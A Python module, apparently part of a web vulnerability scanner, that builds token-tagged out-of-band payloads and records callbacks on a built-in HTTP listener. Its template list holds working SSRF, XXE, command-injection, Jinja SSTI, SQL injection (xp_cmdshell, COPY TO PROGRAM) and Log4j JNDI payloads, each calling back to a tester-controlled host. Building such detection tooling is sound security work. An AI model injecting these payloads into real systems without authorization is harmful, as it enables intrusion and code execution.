"""
Out-of-Band (OOB) Detection Engine v1.0.0-ENTERPRISE
=====================================================

SSRF, XXE, RCE sem OAST = guess.

Features:
- DNS Logger interno (ou integração com externos)
- Token único por payload
- Correlation ID para rastrear callbacks
- Suporte HTTP e DNS
- Funciona mesmo em SAFE MODE!

Princípio: Sem OOB, testes blind são apenas suposições!
"""

import asyncio
import hashlib
import secrets
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from threading import Thread
from typing import Optional, List, Dict, Any


class OOBProtocol(Enum):
    """Supported OOB protocols"""
    DNS = "dns"
    HTTP = "http"
    HTTPS = "https"
    SMTP = "smtp"
    FTP = "ftp"
    LDAP = "ldap"


class CallbackType(Enum):
    """Type of OOB callback received"""
    DNS_LOOKUP = "dns_lookup"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    SMTP_CONNECTION = "smtp_connection"
    GENERIC = "generic"


@dataclass
class OOBToken:
    """
    A unique token for tracking OOB callbacks
    
    Each payload gets a unique token to correlate callbacks
    """
    token: str
    correlation_id: str
    scan_id: str
    payload_type: str  # ssrf, xxe, rce, etc.
    target_url: str
    parameter: str
    created_at: datetime = field(default_factory=datetime.now)
    expires_at: datetime = field(default_factory=lambda: datetime.now() + timedelta(hours=1))
    
    # Payload context
    payload_template: str = ""
    injection_point: str = ""
    
    # Callback tracking
    callbacks_received: List[Dict[str, Any]] = field(default_factory=list)
    first_callback_at: Optional[datetime] = None
    
    @property
    def is_expired(self) -> bool:
        return datetime.now() > self.expires_at
    
    @property
    def has_callback(self) -> bool:
        return len(self.callbacks_received) > 0
    
    def record_callback(self, callback_type: CallbackType, source_ip: str, data: Dict[str, Any]):
        """Record a received callback"""
        callback_record = {
            "type": callback_type.value,
            "source_ip": source_ip,
            "received_at": datetime.now().isoformat(),
            "data": data
        }
        
        if not self.first_callback_at:
            self.first_callback_at = datetime.now()
        
        self.callbacks_received.append(callback_record)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "token": self.token,
            "correlation_id": self.correlation_id,
            "scan_id": self.scan_id,
            "payload_type": self.payload_type,
            "target_url": self.target_url,
            "parameter": self.parameter,
            "created_at": self.created_at.isoformat(),
            "expires_at": self.expires_at.isoformat(),
            "is_expired": self.is_expired,
            "has_callback": self.has_callback,
            "callbacks_received": self.callbacks_received,
            "first_callback_at": self.first_callback_at.isoformat() if self.first_callback_at else None
        }


@dataclass
class OOBCallback:
    """
    Represents a received OOB callback
    """
    token: str
    callback_type: CallbackType
    protocol: OOBProtocol
    source_ip: str
    received_at: datetime
    raw_data: str
    parsed_data: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "token": self.token,
            "callback_type": self.callback_type.value,
            "protocol": self.protocol.value,
            "source_ip": self.source_ip,
            "received_at": self.received_at.isoformat(),
            "raw_data": self.raw_data[:1000],
            "parsed_data": self.parsed_data
        }


class OOBPayloadGenerator:
    """
    Generates OOB payloads with embedded tokens
    """
    
    # Payload templates for different vulnerability types
    TEMPLATES = {
        # SSRF payloads
        "ssrf_http": "http://{callback_host}/{token}",
        "ssrf_https": "https://{callback_host}/{token}",
        "ssrf_dns": "http://{token}.{callback_domain}/",
        
        # XXE payloads
        "xxe_http": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback_host}/{token}">]><foo>&xxe;</foo>',
        "xxe_dns": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{token}.{callback_domain}/">]><foo>&xxe;</foo>',
        "xxe_param": '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback_host}/{token}">%xxe;]>',
        
        # RCE payloads (safe - just DNS lookup)
        "rce_nslookup": "nslookup {token}.{callback_domain}",
        "rce_curl": "curl http://{callback_host}/{token}",
        "rce_wget": "wget http://{callback_host}/{token}",
        "rce_ping": "ping -c 1 {token}.{callback_domain}",
        
        # SSTI payloads
        "ssti_jinja_http": "{{% import 'os' %}}{{% set _ = os.popen('curl http://{callback_host}/{token}').read() %}}",
        "ssti_jinja_dns": "{{% import 'os' %}}{{% set _ = os.popen('nslookup {token}.{callback_domain}').read() %}}",
        
        # Blind SQLi with OOB (2026-02-12: Expanded coverage)
        # Oracle OOB
        "sqli_oracle_http": "SELECT UTL_HTTP.REQUEST('http://{callback_host}/{token}') FROM DUAL",
        "sqli_oracle_dns": "SELECT UTL_INADDR.GET_HOST_ADDRESS('{token}.{callback_domain}') FROM DUAL",
        "sqli_oracle_utl": "' UNION SELECT UTL_HTTP.REQUEST('http://{callback_host}/{token}') FROM DUAL--",
        # MSSQL OOB
        "sqli_mssql_dns": "EXEC master..xp_dirtree '//{token}.{callback_domain}/a'",
        "sqli_mssql_http": "EXEC master..xp_cmdshell 'nslookup {token}.{callback_domain}'",
        "sqli_mssql_linked": "SELECT * FROM OPENROWSET('SQLOLEDB','server={token}.{callback_domain}','SELECT 1')",
        # PostgreSQL OOB
        "sqli_postgres_dns": "COPY (SELECT '{token}') TO PROGRAM 'nslookup {token}.{callback_domain}'",
        "sqli_postgres_http": "CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host={callback_host} dbname={token}')",
        # MySQL OOB
        "sqli_mysql_dns": "SELECT LOAD_FILE(CONCAT('//','{token}.{callback_domain}/',VERSION()))",
        "sqli_mysql_into": "SELECT * INTO OUTFILE '//{token}.{callback_domain}/a' FROM dual",

        # Log4j / JNDI
        "jndi_ldap": "${{jndi:ldap://{callback_host}/{token}}}",
        "jndi_dns": "${{jndi:dns://{token}.{callback_domain}}}",
    }
    
    def __init__(
        self,
        callback_host: str = "127.0.0.1:8888",
        callback_domain: str = "oob.local"
    ):
        """
        Initialize payload generator
        
        Args:
            callback_host: HTTP callback host (IP:port or hostname)
            callback_domain: DNS callback domain
        """
        self.callback_host = callback_host
        self.callback_domain = callback_domain
    
    def generate_token(self, length: int = 16) -> str:
        """Generate a unique token"""
        return secrets.token_hex(length // 2)
    
    def generate_correlation_id(self, scan_id: str, target: str, param: str) -> str:
        """Generate correlation ID from context"""
        data = f"{scan_id}:{target}:{param}:{time.time()}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]
    
    def generate_payload(
        self,
        template_name: str,
        token: str
    ) -> str:
        """
        Generate a payload from template with token
        
        Args:
            template_name: Name of template to use
            token: Unique token for this payload
            
        Returns:
            Payload string with embedded token
        """
        template = self.TEMPLATES.get(template_name)
        if not template:
            raise ValueError(f"Unknown template: {template_name}")
        
        return template.format(
            token=token,
            callback_host=self.callback_host,
            callback_domain=self.callback_domain
        )
    
    def generate_all_payloads(
        self,
        payload_type: str,
        token: str
    ) -> List[Dict[str, str]]:
        """
        Generate all payloads for a vulnerability type
        
        Args:
            payload_type: ssrf, xxe, rce, ssti, sqli, jndi
            token: Unique token
            
        Returns:
            List of dicts with payload and template name
        """
        payloads = []
        prefix = f"{payload_type}_"
        
        for name, template in self.TEMPLATES.items():
            if name.startswith(prefix):
                payload = self.generate_payload(name, token)
                payloads.append({
                    "template": name,
                    "payload": payload,
                    "token": token,
                    "protocol": "dns" if "dns" in name or "domain" in name else "http"
                })
        
        return payloads


class OOBCallbackStore:
    """
    Stores and correlates OOB callbacks with tokens
    """
    
    def __init__(self, token_ttl_hours: int = 1):
        self.tokens: Dict[str, OOBToken] = {}
        self.callbacks: List[OOBCallback] = []
        self.token_ttl = timedelta(hours=token_ttl_hours)
        self._callbacks_by_token: Dict[str, List[OOBCallback]] = {}
    
    def register_token(
        self,
        scan_id: str,
        payload_type: str,
        target_url: str,
        parameter: str,
        payload_template: str = "",
        injection_point: str = ""
    ) -> OOBToken:
        """
        Register a new OOB token
        
        Returns the token object for tracking
        """
        token_str = secrets.token_hex(8)
        correlation_id = hashlib.sha256(
            f"{scan_id}:{target_url}:{parameter}:{time.time()}".encode()
        ).hexdigest()[:16]
        
        token = OOBToken(
            token=token_str,
            correlation_id=correlation_id,
            scan_id=scan_id,
            payload_type=payload_type,
            target_url=target_url,
            parameter=parameter,
            expires_at=datetime.now() + self.token_ttl,
            payload_template=payload_template,
            injection_point=injection_point
        )
        
        self.tokens[token_str] = token
        self._callbacks_by_token[token_str] = []
        
        return token
    
    def record_callback(
        self,
        token_str: str,
        callback_type: CallbackType,
        protocol: OOBProtocol,
        source_ip: str,
        raw_data: str,
        parsed_data: Optional[Dict[str, Any]] = None
    ) -> bool:
        """
        Record a received callback
        
        Returns True if token exists and callback recorded
        """
        if token_str not in self.tokens:
            return False
        
        token = self.tokens[token_str]
        if token.is_expired:
            return False
        
        callback = OOBCallback(
            token=token_str,
            callback_type=callback_type,
            protocol=protocol,
            source_ip=source_ip,
            received_at=datetime.now(),
            raw_data=raw_data,
            parsed_data=parsed_data or {}
        )
        
        self.callbacks.append(callback)
        self._callbacks_by_token[token_str].append(callback)
        
        # Update token
        token.record_callback(callback_type, source_ip, callback.to_dict())
        
        return True
    
    def get_token(self, token_str: str) -> Optional[OOBToken]:
        """Get token by string"""
        return self.tokens.get(token_str)
    
    def get_callbacks_for_token(self, token_str: str) -> List[OOBCallback]:
        """Get all callbacks for a token"""
        return self._callbacks_by_token.get(token_str, [])
    
    def check_callback(self, token_str: str) -> bool:
        """Check if a callback was received for token"""
        token = self.tokens.get(token_str)
        return token.has_callback if token else False
    
    def wait_for_callback(
        self,
        token_str: str,
        timeout_seconds: float = 30.0,
        poll_interval: float = 0.5
    ) -> bool:
        """
        Wait for callback with polling
        
        Returns True if callback received within timeout
        """
        start = time.time()
        while time.time() - start < timeout_seconds:
            if self.check_callback(token_str):
                return True
            time.sleep(poll_interval)
        return False
    
    def cleanup_expired(self):
        """Remove expired tokens"""
        now = datetime.now()
        expired = [t for t, token in self.tokens.items() if token.is_expired]
        for token_str in expired:
            del self.tokens[token_str]
            if token_str in self._callbacks_by_token:
                del self._callbacks_by_token[token_str]
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get callback statistics"""
        total_tokens = len(self.tokens)
        tokens_with_callbacks = sum(1 for t in self.tokens.values() if t.has_callback)
        
        by_type = {}
        for token in self.tokens.values():
            ptype = token.payload_type
            by_type[ptype] = by_type.get(ptype, {"total": 0, "callbacks": 0})
            by_type[ptype]["total"] += 1
            if token.has_callback:
                by_type[ptype]["callbacks"] += 1
        
        return {
            "total_tokens": total_tokens,
            "tokens_with_callbacks": tokens_with_callbacks,
            "callback_rate": round(tokens_with_callbacks / total_tokens * 100, 2) if total_tokens else 0,
            "by_payload_type": by_type,
            "total_callbacks": len(self.callbacks)
        }


class SimpleHTTPCallbackServer:
    """
    Simple HTTP callback server for OOB detection
    
    Listens for HTTP callbacks and records them
    """
    
    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8888,
        callback_store: Optional[OOBCallbackStore] = None
    ):
        self.host = host
        self.port = port
        self.store = callback_store or OOBCallbackStore()
        self._server = None
        self._thread = None
        self._running = False
    
    def start(self):
        """Start the callback server in a background thread"""
        if self._running:
            return
        
        self._running = True
        self._thread = Thread(target=self._run_server, daemon=True)
        self._thread.start()
    
    def stop(self):
        """Stop the callback server"""
        self._running = False
        if self._server:
            self._server.close()
    
    def _run_server(self):
        """Run the HTTP server"""
        import http.server
        import socketserver
        
        store = self.store
        
        class CallbackHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Suppress logging
            
            def do_GET(self):
                # Extract token from path
                path = self.path.strip('/')
                token = path.split('/')[0] if '/' in path else path
                
                # Record callback
                store.record_callback(
                    token_str=token,
                    callback_type=CallbackType.HTTP_GET,
                    protocol=OOBProtocol.HTTP,
                    source_ip=self.client_address[0],
                    raw_data=f"GET {self.path}",
                    parsed_data={
                        "method": "GET",
                        "path": self.path,
                        "headers": dict(self.headers)
                    }
                )
                
                # Send response
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
                
                path = self.path.strip('/')
                token = path.split('/')[0] if '/' in path else path
                
                store.record_callback(
                    token_str=token,
                    callback_type=CallbackType.HTTP_POST,
                    protocol=OOBProtocol.HTTP,
                    source_ip=self.client_address[0],
                    raw_data=f"POST {self.path}\n{body}",
                    parsed_data={
                        "method": "POST",
                        "path": self.path,
                        "body": body[:1000],
                        "headers": dict(self.headers)
                    }
                )
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
        
        with socketserver.TCPServer((self.host, self.port), CallbackHandler) as httpd:
            self._server = httpd
            while self._running:
                httpd.handle_request()


class OOBEngine:
    """
    Main Out-of-Band Detection Engine
    
    Coordinates token generation, payload creation, and callback tracking
    """
    
    VERSION = "1.0.0-ENTERPRISE"
    
    def __init__(
        self,
        callback_host: str = "127.0.0.1",
        callback_port: int = 8888,
        callback_domain: str = "oob.local",
        start_server: bool = False
    ):
        """
        Initialize OOB Engine
        
        Args:
            callback_host: IP/hostname for HTTP callbacks
            callback_port: Port for HTTP callback server
            callback_domain: Domain for DNS callbacks
            start_server: Whether to start built-in HTTP server
        """
        self.callback_host = f"{callback_host}:{callback_port}"
        self.callback_domain = callback_domain
        
        self.store = OOBCallbackStore()
        self.generator = OOBPayloadGenerator(
            callback_host=self.callback_host,
            callback_domain=callback_domain
        )
        
        self._server = None
        if start_server:
            self._server = SimpleHTTPCallbackServer(
                host=callback_host,
                port=callback_port,
                callback_store=self.store
            )
            self._server.start()
    
    def generate_oob_payloads(
        self,
        scan_id: str,
        payload_type: str,
        target_url: str,
        parameter: str
    ) -> List[Dict[str, Any]]:
        """
        Generate OOB payloads with tracking
        
        Args:
            scan_id: Current scan ID
            payload_type: Type (ssrf, xxe, rce, ssti, sqli, jndi)
            target_url: Target URL being tested
            parameter: Parameter being tested
            
        Returns:
            List of payload dicts with tokens
        """
        results = []
        
        # Register token
        token = self.store.register_token(
            scan_id=scan_id,
            payload_type=payload_type,
            target_url=target_url,
            parameter=parameter
        )
        
        # Generate payloads for this type
        payloads = self.generator.generate_all_payloads(
            payload_type=payload_type,
            token=token.token
        )
        
        for payload_data in payloads:
            results.append({
                **payload_data,
                "oob_token": token.token,
                "correlation_id": token.correlation_id,
                "callback_host": self.callback_host,
                "callback_domain": self.callback_domain
            })
        
        return results
    
    def check_callback(self, token: str) -> bool:
        """Check if callback was received for token"""
        return self.store.check_callback(token)
    
    async def wait_for_callback_async(
        self,
        token: str,
        timeout: float = 30.0
    ) -> bool:
        """Async wait for callback"""
        start = time.time()
        while time.time() - start < timeout:
            if self.store.check_callback(token):
                return True
            await asyncio.sleep(0.5)
        return False
    
    def get_callback_evidence(self, token: str) -> Optional[Dict[str, Any]]:
        """
        Get callback evidence for a token
        
        Returns evidence dict suitable for finding
        """
        token_obj = self.store.get_token(token)
        if not token_obj or not token_obj.has_callback:
            return None
        
        callbacks = self.store.get_callbacks_for_token(token)
        
        return {
            "token": token,
            "payload_type": token_obj.payload_type,
            "target": token_obj.target_url,
            "parameter": token_obj.parameter,
            "callback_count": len(callbacks),
            "first_callback": callbacks[0].to_dict() if callbacks else None,
            "all_callbacks": [c.to_dict() for c in callbacks],
            "time_to_callback_ms": (
                (token_obj.first_callback_at - token_obj.created_at).total_seconds() * 1000
                if token_obj.first_callback_at else None
            )
        }
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get OOB engine statistics"""
        return {
            "version": self.VERSION,
            "callback_host": self.callback_host,
            "callback_domain": self.callback_domain,
            **self.store.get_statistics()
        }
    
    def shutdown(self):
        """Shutdown the engine"""
        if self._server:
            self._server.stop()
        self.store.cleanup_expired()


# External OOB service integrations
class ExternalOOBService:
    """
    Integration with external OOB services
    
    Supports:
    - Burp Collaborator
    - Interactsh
    - Canarytokens
    """
    
    SERVICES = {
        "interactsh": {
            "base_url": "https://interact.sh",
            "dns_format": "{token}.interact.sh",
            "http_format": "http://{token}.interact.sh"
        },
        "burp_collaborator": {
            "base_url": "https://burpcollaborator.net",
            "dns_format": "{token}.burpcollaborator.net",
            "http_format": "http://{token}.burpcollaborator.net"
        }
    }
    
    def __init__(self, service: str = "interactsh"):
        if service not in self.SERVICES:
            raise ValueError(f"Unknown service: {service}")
        self.service = service
        self.config = self.SERVICES[service]
    
    def generate_payload_url(self, token: str, protocol: str = "http") -> str:
        """Generate payload URL for external service"""
        if protocol == "dns":
            return self.config["dns_format"].format(token=token)
        return self.config["http_format"].format(token=token)


# Export
__all__ = [
    "OOBEngine",
    "OOBToken",
    "OOBCallback",
    "OOBCallbackStore",
    "OOBPayloadGenerator",
    "OOBProtocol",
    "CallbackType",
    "SimpleHTTPCallbackServer",
    "ExternalOOBService"
]
